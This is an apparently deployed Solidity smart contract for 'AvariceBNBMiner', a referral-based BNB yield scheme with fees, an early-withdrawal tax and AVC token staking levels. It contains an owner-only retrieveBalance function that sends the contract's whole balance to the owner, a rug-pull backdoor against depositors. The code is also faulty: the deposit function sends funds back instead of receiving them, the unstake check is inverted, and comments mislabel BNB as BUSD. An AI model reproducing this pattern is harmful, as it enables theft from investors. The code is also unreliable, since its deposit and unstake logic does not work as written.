/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IAVARICE {
    function _clcDay() external returns (uint256);

    function lobbyEntry(uint256) external returns (uint256); //BNB amount for a given day
}

contract AvariceBNBMiner {
    IERC20 public avcToken;
    address public AVARICE_ADDRESS;
    /** Base parameters for AVARICE Miner **/
    uint256 public EGGS_TO_HIRE_1MINERS = 1080000;
    uint256 public REFERRAL = 50;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public DEV = 10;
    uint256 public TEAM = 25;
    uint256 public MKT = 5;
    uint256 public MARKET_EGGS_PERCENT_MUL = 4;
    uint256 public MARKET_EGGS_PERCENT_DIV = 5;
    uint256 public ROI_BOOST = 3;

    uint256 public MIN_INVEST_LIMIT = 10 ether; /** min. 10 BUSD  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 50000 ether; /** max. 50000 BUSD  **/

    uint256 public COMPOUND_BONUS_MAX_TIMES = 6; /** 6 Times Compound every 24 Hours / 6 days. **/

    uint256 public WITHDRAWAL_TAX = 500; // 50% tax for For Early Withdrawals - Penalties
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 6; // Compound days, for no tax Withdrawal.

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public marketEggs;
    bool public contractStarted;

    uint256 public COMPOUND_STEP = 1 days; // 24 Hours Compound Timer
    uint256 public CUTOFF_STEP = 36 hours; // 36 Hours Rewards Accumulation Cut-Off

    uint256 internal NPV_unit = 1 gwei;

    /* addresses */
    address public owner;
    address public dev1;
    address public dev2;
    address public team;
    address public mkt;

    mapping(address => uint256) public levelMap;
    mapping(address => uint256) public stakeAmount;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 farmerCompoundCount;
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    constructor(
        address _dev1,
        address _dev2,
        address _team,
        address _mkt,
        address _avarice_address
    ) {
        require(!isContract(_dev1) && !isContract(_dev2) && !isContract(_team));
        owner = msg.sender;
        dev1 = _dev1;
        dev2 = _dev2;
        team = _team;
        mkt = _mkt;
        AVARICE_ADDRESS = _avarice_address;
        avcToken = IERC20(_avarice_address);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function startFarm() external {
        if (!contractStarted) {
            if (msg.sender == owner) {
                contractStarted = true;
                marketEggs = 1000 gwei;
            } else revert('Not authorized.');
        }
    }

    // Compound Function - Re-Hire Winemakers
    function hireMoreFarmers() public {
        User storage user = users[msg.sender];
        require(contractStarted, 'Contract not started yet.');
        require((block.timestamp - user.lastHatch) >= COMPOUND_STEP, 'Tried to compound too early.');
        uint256 eggsUsed = getMyEggs();
        uint256 eggsForCompound = eggsUsed;

        uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
        user.userDeposit += eggsUsedValue;
        totalCompound += eggsUsedValue;
        if (user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
            user.dailyCompoundBonus += 1;
        }
        user.farmerCompoundCount += 1;

        user.miners += eggsForCompound / EGGS_TO_HIRE_1MINERS;
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        marketEggs += (eggsUsed * MARKET_EGGS_PERCENT_MUL) / MARKET_EGGS_PERCENT_DIV;
    }

    // Sell Wine Function
    function sellCrops() external {
        require(contractStarted, 'Contract not started yet.');

        User storage user = users[msg.sender];
        require(user.initialDeposit > 0, 'You have not invested yet.');
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);

        if (user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL) {
            //daily compound bonus count will not reset and eggValue will be deducted with feedback tax.
            eggValue -= (eggValue * WITHDRAWAL_TAX) / PERCENTS_DIVIDER;
        } else {
            //set daily compound bonus count to 0 and eggValue will remain without deductions
            user.dailyCompoundBonus = 0;
            user.farmerCompoundCount = 0;
        }

        user.lastWithdrawTime = block.timestamp;
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        if (getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue - payFees(eggValue);
        payable(msg.sender).transfer(eggsPayout);
        user.totalWithdrawn += eggsPayout;
        totalWithdrawn += eggsPayout;
    }

    function calculatePayFees(uint256 eggValue) internal view returns (uint256) {
        uint256 devtax = (eggValue * DEV) / PERCENTS_DIVIDER;
        uint256 mktng = (eggValue * MKT) / PERCENTS_DIVIDER;
        uint256 teamtax = (eggValue * TEAM) / PERCENTS_DIVIDER;
        return 2 * devtax + teamtax + mktng;
    }

    /** Buy Winemakers with BUSD **/
    function hireFarmers(address ref, uint256 amount) external {
        require(contractStarted, 'Contract not started yet.');
        User storage user = users[msg.sender];
        require(amount >= MIN_INVEST_LIMIT, 'Mininum investment not met.');
        require(user.initialDeposit + amount <= WALLET_DEPOSIT_LIMIT, 'Max deposit limit reached.');
        payable(address(msg.sender)).transfer(amount);
        uint256 net_amount = amount - payFees(amount);
        uint256 eggsBought = calculateEggBuy(net_amount, getBalance() - net_amount);
        user.userDeposit += amount;
        user.initialDeposit += amount;
        user.claimedEggs += eggsBought;

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount += 1;
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = (amount * REFERRAL) / PERCENTS_DIVIDER;
                payable(upline).transfer(refRewards);
                users[upline].referralEggRewards += refRewards;
                totalRefBonus += refRewards;
            }
        }
        uint256 eggsForCompound = getMyEggs();

        user.miners += eggsForCompound / EGGS_TO_HIRE_1MINERS;
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        marketEggs += eggsForCompound;

        totalStaked += net_amount;
        totalDeposits += 1;
    }

    function payFees(uint256 eggValue) internal returns (uint256) {
        uint256 devtax = (eggValue * DEV) / PERCENTS_DIVIDER;
        uint256 mktng = (eggValue * MKT) / PERCENTS_DIVIDER;
        uint256 teamtax = (eggValue * TEAM) / PERCENTS_DIVIDER;
        payable(dev1).transfer(devtax);
        payable(dev2).transfer(devtax);
        payable(mkt).transfer(mktng);
        payable(team).transfer(teamtax);
        return 2 * devtax + teamtax + mktng;
    }

    function getUserInfo(address _adr)
        external
        view
        returns (
            uint256 _initialDeposit,
            uint256 _userDeposit,
            uint256 _miners,
            uint256 _claimedEggs,
            uint256 _lastHatch,
            address _referrer,
            uint256 _referrals,
            uint256 _totalWithdrawn,
            uint256 _referralEggRewards,
            uint256 _dailyCompoundBonus,
            uint256 _farmerCompoundCount,
            uint256 _lastWithdrawTime
        )
    {
        _initialDeposit = users[_adr].initialDeposit;
        _userDeposit = users[_adr].userDeposit;
        _miners = users[_adr].miners;
        _claimedEggs = users[_adr].claimedEggs;
        _lastHatch = users[_adr].lastHatch;
        _referrer = users[_adr].referrer;
        _referrals = users[_adr].referralsCount;
        _totalWithdrawn = users[_adr].totalWithdrawn;
        _referralEggRewards = users[_adr].referralEggRewards;
        _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
        _farmerCompoundCount = users[_adr].farmerCompoundCount;
        _lastWithdrawTime = users[_adr].lastWithdrawTime;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getAvailableEarnings(address _adr) external view returns (uint256) {
        uint256 userEggs = users[_adr].claimedEggs + getEggsSinceLastHatch(_adr);
        return calculateEggSell(userEggs);
    }

    function calculateTrade(
        uint256 a,
        uint256 b,
        uint256 m
    ) internal view returns (uint256) {
        return (a * m) / (NPV_unit + b);
    }

    function calculateEggSell(uint256 eggs) public view returns (uint256) {
        return calculateTrade(ROI_BOOST * eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth, uint256 contractBalance) public view returns (uint256) {
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) external view returns (uint256) {
        return calculateEggBuy(eth - calculatePayFees(eth), getBalance());
    }

    /** How many miners and eggs per day user will recieve based on BNB deposit **/
    function getEggsYield(uint256 amount) external view returns (uint256, uint256) {
        uint256 eggsAmount = calculateEggBuy(amount, getBalance());
        uint256 miners = eggsAmount / EGGS_TO_HIRE_1MINERS;
        uint256 day = 1 days;
        uint256 eggsPerDay = day * miners;
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay);
        return (miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs) public view returns (uint256) {
        return calculateTrade(ROI_BOOST * eggs, marketEggs, getBalance());
    }

    function getSiteInfo()
        external
        view
        returns (
            uint256 _totalStaked,
            uint256 _totalDeposits,
            uint256 _totalCompound,
            uint256 _totalRefBonus
        )
    {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() external view returns (uint256) {
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns (uint256) {
        return users[msg.sender].claimedEggs + getEggsSinceLastHatch(msg.sender);
    }

    function getEggsSinceLastHatch(address adr) public view returns (uint256) {
        uint256 secondsSinceLastHatch = block.timestamp - users[adr].lastHatch;
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);

        uint256 _miners = users[adr].miners;
        uint256 boostedMiners = getBoostedMiners(levelMap[adr], _miners);

        return secondsPassed * (_miners + boostedMiners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    // AVC amount for a given day
    function getAmountForDay(uint256 _day) public pure returns (uint256) {
        uint256 amount = 3000000 * 1e18;
        if (_day < 2) {
            return amount;
        }
        for (uint256 i = 1; i < _day; i++) {
            amount = (amount * 995) / 1000;
        }
        return amount;
    }

    function getBoostedMiners(uint256 level, uint256 originalMiners) public pure returns (uint256) {
        uint256 baseBoost = (originalMiners * 9375) / 2 / 75000;
        if (level == 0) {
            return 0;
        } else {
            return level * baseBoost;
        }
    }

    /* Get avc amount needed to reach each level */
    function getAVCForLevelsList() public returns (uint256[8] memory) {
        IAVARICE avarice = IAVARICE(AVARICE_ADDRESS);
        uint256 currentDay = avarice._clcDay();
        uint256 previousAVCAmount = getAmountForDay(currentDay - 1);
        uint256 previousBNBAmount = avarice.lobbyEntry(currentDay - 1);
        uint256 AVCPerBNB = previousAVCAmount / previousBNBAmount;
        uint256[8] memory avcList = [
            AVCPerBNB / 10,
            AVCPerBNB / 4,
            AVCPerBNB / 2,
            (AVCPerBNB * 4) / 5,
            (AVCPerBNB * 5) / 4,
            (AVCPerBNB * 7) / 4,
            (AVCPerBNB * 5) / 2,
            (AVCPerBNB * 7) / 2
        ];
        return avcList;
    }

    function setUserLevel(uint256 _userStakedAmount) internal {
        uint256[8] memory _avcList = getAVCForLevelsList();
        if (_userStakedAmount < _avcList[0]) {
            levelMap[msg.sender] = 0;
        } else if (_avcList[0] <= _userStakedAmount && _userStakedAmount < _avcList[1]) {
            levelMap[msg.sender] = 1;
        } else if (_avcList[1] <= _userStakedAmount && _userStakedAmount < _avcList[2]) {
            levelMap[msg.sender] = 2;
        } else if (_avcList[2] <= _userStakedAmount && _userStakedAmount < _avcList[3]) {
            levelMap[msg.sender] = 3;
        } else if (_avcList[3] <= _userStakedAmount && _userStakedAmount < _avcList[4]) {
            levelMap[msg.sender] = 4;
        } else if (_avcList[4] <= _userStakedAmount && _userStakedAmount < _avcList[5]) {
            levelMap[msg.sender] = 5;
        } else if (_avcList[5] <= _userStakedAmount && _userStakedAmount < _avcList[6]) {
            levelMap[msg.sender] = 6;
        } else if (_avcList[6] <= _userStakedAmount && _userStakedAmount < _avcList[7]) {
            levelMap[msg.sender] = 7;
        } else {
            levelMap[msg.sender] = 8;
        }
    }

    function stakeAVC(uint256 _sAmount) public {
        require(_sAmount > 0, 'Stake amount can not be empty!');
        require(users[msg.sender].miners > 0, 'Miners can not be empty!');

        hireMoreFarmers();
        avcToken.transferFrom(address(msg.sender), address(this), _sAmount);
        stakeAmount[msg.sender] = stakeAmount[msg.sender] + _sAmount;
        setUserLevel(stakeAmount[msg.sender]);
    }

    function unstakeAVC(uint256 _uAmount) public {
        require(_uAmount >= stakeAmount[msg.sender], 'Unstake amount can not be greater than staked amount!');

        hireMoreFarmers();
        avcToken.transfer(msg.sender, _uAmount);
        stakeAmount[msg.sender] = stakeAmount[msg.sender] - _uAmount;
        setUserLevel(stakeAmount[msg.sender]);
    }

    function retrieveBalance() public {
        require(msg.sender == owner, 'fuck you');
        payable(owner).transfer(address(this).balance);
    }
}